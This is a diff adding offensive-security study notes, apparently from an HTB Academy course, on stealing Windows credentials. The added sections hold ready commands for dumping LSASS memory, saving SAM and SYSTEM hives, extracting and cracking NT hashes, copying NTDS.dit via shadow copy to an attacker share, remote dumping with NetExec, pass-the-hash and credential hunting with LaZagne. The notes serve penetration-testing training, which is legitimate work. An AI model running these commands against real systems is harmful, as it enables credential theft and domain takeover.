@@ -77,6 +77,46 @@ Winlogon is the only process that intercepts login requests from the keyboard se
 Each interactive logon session creates a separate instance of the Winlogon service.  
 The [Graphical Identification and Authentication](https://docs.microsoft.com/en-us/windows/win32/secauthn/gina) (GINA) architecture is loaded into the process area used by Winlogon, receives and processes the credentials, and invokes the authentication interfaces via the [LSALogonUser](https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsalogonuser) function.
 
+#### Attacking LSASS
+
+Upon initial logon, LSASS will:
+
+- Cache credentials locally in memory
+- Create access tokens
+- Enforce security policies
+- Write to Windows security log
+
+##### Dumping LSASS Process Memory
+
+- With Task Manager (requires GUI access)
+
+![Task Manager](.res/2024-01-21-14-17-53.png)
+
+> Image from HTB Academy
+
+A file `lsass.DMP` will be in `C:\Users\loggedonusersdirectory\AppData\Local\Temp`
+
+- With Rundll32.exe & Comsvcs.dll
+
+Before issuing the command to create the dump file, we must determine what process ID (PID) is assigned to lsass.exe. This can be done from cmd or PowerShell:
+
+- `tasklist /svc` from cmd
+- `Get-Process lsass` from powershell
+- `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full` lsass dump with powershell
+
+#### Using Pypykatz to Extract Credentials
+
+- Install pypykatz
+
+```bash
+mkdir pypykatz
+python3 -m venv .
+source bin/activate
+pip install pypykatz
+```
+
+- `pypykatz lsa minidump /home/peter/Documents/lsass.dmp`
+
 ### SAM Database
 
 The [Security Account Manager](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748(v=ws.10)?redirectedfrom=MSDN) (SAM) is a database file in Windows operating systems that stores users' passwords. It can be used to authenticate local and remote users. SAM uses cryptographic measures to prevent unauthenticated users from accessing the system. User passwords are stored in a hash format in a registry structure as either an LM hash or an NTLM hash. This file is located in `%SystemRoot%/system32/config/SAM` and is mounted on HKLM/SAM. SYSTEM level permissions are required to view it.
@@ -88,6 +128,38 @@ Microsoft introduced a security feature in Windows NT 4.0 to help improve the se
 ![Credential Manager](../.res/2023-04-22-16-45-56.png)  
 
 Credential Manager is a feature built-in to all Windows operating systems that allows users to save the credentials they use to access various network resources and websites. Saved credentials are stored based on user profiles in each user's Credential Locker. Credentials are encrypted and stored in `C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\`  
+
+#### Copying SAM Registry Hives
+
+There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes.  
+
+|Registry Hive|Description|
+|-------------|-----------|
+|hklm\sam|Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.|
+|hklm\system|Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.|
+|hklm\security|Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.|
+
+We can create backups of these hives using the `reg.exe` utility.  
+
+- `reg.exe save hklm\sam C:\sam.save`
+- `reg.exe save hklm\system C:\system.save`
+- `reg.exe save hklm\security C:\security.save`
+
+#### Dumping Hashes with Impacket's secretsdump.py
+
+- `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`
+
+### Running Hashcat against NT hashes
+
+- `sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt`
+
+### Dumping LSA Secrets Remotely
+
+- `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa`
+
+### Dumping SAM Remotely
+
+- `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam`
 
 ### NTDS
 
@@ -102,7 +174,73 @@ It is very common to come across network environments where Windows systems are 
 
 ### Dictionary Attacks
 
-Dictionary attacks involve using a pre-generated list of words and phrases (known as a dictionary) to attempt to crack a password. This list of words and phrases is often acquired from various sources, such as publicly available dictionaries, leaked passwords, or even purchased from specialized companies. The dictionary is then used to generate a series of strings which are then used to compare against the hashed passwords. If a match is found, the password is cracked, providing an attacker access to the system and the data stored within it. This type of attack is highly effective. Therefore, it is essential to take the necessary steps to ensure that passwords are kept secure, such as using complex and unique passwords, regularly changing them, and using two-factor authentication.
+Dictionary attacks involve using a pre-generated list of words and phrases (known as a dictionary) to attempt to crack a password. This list of words and phrases is often acquired from various sources, such as publicly available dictionaries, leaked passwords, or even purchased from specialized companies. The dictionary is then used to generate a series of strings which are then used to compare against the hashed passwords. If a match is found, the password is cracked, providing an attacker access to the system and the data stored within it. This type of attack is highly effective. Therefore, it is essential to take the necessary steps to ensure that passwords are kept secure, such as using complex and unique passwords, regularly changing them, and using two-factor authentication.  
+
+When we find ourselves in a scenario where a dictionary attack is a viable next step, we can benefit from trying to custom tailor our attack as much as possible. In this case, we can consider the organization we are working with to perform the engagement against and use searches on various social media websites and look for an employee directory on the company's website. Doing this can result in us gaining the names of employees that work at the organization. One of the first things a new employee will get is a username. Many organizations follow a naming convention when creating employee usernames. Here are some common conventions to consider:  
+
+|Username Convention|Practical Example for Jane Jill Doe|
+|-------------------|-----------------------------------|
+|firstinitiallastname|jdoe|
+|firstinitialmiddleinitiallastname|jjdoe|
+|firstnamelastname|janedoe|
+|firstname.lastname|jane.doe|
+|lastname.firstname|doe.jane|
+|nickname|doedoehacksstuff|
+
+> A tip from MrB3n: We can often find the email structure by Googling the domain name, i.e., “@inlanefreight.com” and get some valid emails. From there, we can use a script to scrape various social media sites and mashup potential valid usernames. Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like a907 (or something similar) back to joe.smith.  
+> Sometimes you can use google dorks to search for “inlanefreight.com filetype:pdf” and find some valid usernames in the PDF properties if they were generated using a graphics editor. From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid.  
+
+- `./username-anarchy -i names.txt` convert a list of real names into common usernames formats.
+- `NetExec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt` dictionnary attack with NetExec
+
+### Capturing NTDS.dit
+
+NTDS.dit file is stored at %systemroot$/ntds on the domain controllers in a forest.  
+This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information.  
+
+#### Creating Shadow Copy of C:
+
+We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. 
+
+- `PS C:\> vssadmin CREATE SHADOW /For=C:`
+- `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit` Copying NTDS.dit from the VSS
+- `PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData` Transferring NTDS.dit to Attack Host
+
+#### A Faster Method: Using cme to Capture NTDS.dit
+
+- `NetExec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds` This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.
+
+### Cracking Hashes & Gaining Credentials
+
+- `sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt` Cracking a Single Hash with Hashcat
+- `evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"` pass the hash with evil-winrm (more info about pass-the-hash attacks [here](../windows/pass-hash.md))
+
+### Credential Hunting in Windows
+
+> Here we assume that we have gained access to an IT admin's Windows 10 workstation through RDP.
+
+#### Keyterms to search
+
+- Passwords, Passphrases, Keys, Username, User account, Creds, Users, Passkeys, Passphrases, configuration, dbcredential, dbpassword, pwd, Login, Credentials.
+
+#### Tools
+
+- [Lazagne](https://github.com/AlessandroZ/LaZagne)  
+  - `start lazagne.exe all` execute Lazagne and run all included modules. We can include the option -vv to study what it is doing in the background.  
+- findstr
+  - `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`
+
+#### Other places to keep in mind
+
+- Passwords in Group Policy in the SYSVOL share
+- Passwords in scripts in the SYSVOL share
+- Password in scripts on IT shares
+- Passwords in web.config files on dev machines and IT shares
+- unattend.xml
+- Passwords in the AD user or computer description fields
+- KeePass databases --> pull hash, crack and get loads of access.
+- Found on user systems and shares
+- Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint
 
 ### Brute Force Attacks
 
@@ -116,4 +254,5 @@ Rainbow table attacks involve using a pre-computed table of hashes and their cor
 
 - [Linux User Auth](https://tldp.org/HOWTO/pdf/User-Authentication-HOWTO.pdf)
 - [Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication)
-- [Passwords, Hashes and wordlist tools](https://csbygb.gitbook.io/pentips/tools/passwords-tools)
+- [Passwords, Hashes and wordlist tools](https://csbygb.gitbook.io/pentips/tools/passwords-tools)  
+- [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)
